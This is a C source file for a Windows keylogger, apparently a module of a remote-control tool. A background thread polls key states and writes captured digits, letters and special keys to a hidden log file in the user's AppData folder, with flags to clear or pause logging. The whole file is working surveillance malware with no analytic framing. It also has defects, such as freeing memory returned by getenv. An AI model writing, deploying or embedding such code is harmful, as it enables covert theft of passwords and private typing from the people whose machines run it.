#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int keylogger_cmd = 0;
int keylogger_thread = 0;
int klog_caps = 0;
char* keylogger_path;
FILE *flog;

DWORD keylogger_func()
{
     int i;
     char* appdata_path = getenv("APPDATA");
     keylogger_path = malloc(strlen(appdata_path) + 5 + sizeof(char));
     sprintf(keylogger_path, "%s\\klog", appdata_path);
     flog = fopen(keylogger_path, "a");
     fseek(flog, 0, SEEK_END);

     if(ftell(flog) == 0)
     {
          fclose(flog);
          flog = fopen(keylogger_path, "w");
     }

     fseek(flog, 0, SEEK_SET);
     free(appdata_path);

     while(keylogger_thread)
     {
          Sleep(10);
          fflush(flog);

          if(keylogger_cmd == 0x1)
          {
               fclose(flog);
               flog = fopen(keylogger_path, "w");
               keylogger_cmd = 0x0;
          }else if(keylogger_cmd == 0x2){
               continue;
          }

          for(i = 0x30; i <= 0x69; i++)
          {
               if(GetAsyncKeyState(i) & 0xFF)
               {
                    if(i >= 0x30 && i <= 0x39) //0-9
                    {
                         fputc(i, flog);
                         break;
                    }

                    if(i >= 0x41 && i <= 0x5A) //A-Z
                    {
                         if(GetKeyState(VK_CAPITAL) == 0)
                         {
                              i += 0x20;
                         }

                         fputc(i, flog);
                         break;
                    }

                    if(i >= 0x60 && i <= 0x69) // num 0 - 9
                    {
                         fputc(i, flog);
                         break;
                    }
               }
          }

          if(GetAsyncKeyState(VK_RETURN) & 0xFF)
          {
               fprintf(flog, "[ENTER]");
          }else if(GetAsyncKeyState(VK_SPACE) & 0xFF){
               fprintf(flog, "[SPACE]");
          }else if(GetAsyncKeyState(VK_LEFT) & 0xFF){
               fprintf(flog, "[LEFT]");
          }else if(GetAsyncKeyState(VK_RIGHT) & 0xFF){
               fprintf(flog, "[RIGHT]");
          }else if(GetAsyncKeyState(VK_BACK) & 0xFF){
               fprintf(flog, "[BACKSPACE]");
          }else if(GetAsyncKeyState(VK_TAB) & 0xFF){
               fprintf(flog, "[TAB]");
          }
     }

     fclose(flog);
     free(keylogger_path);
}

void keylogger_Start(void)
{
     keylogger_thread = 1;
     DWORD thread_id;
     CreateThread(NULL, 0, keylogger_func, NULL, 0, &thread_id);
}

void keylogger_Stop(void)
{
     keylogger_thread = 0;
}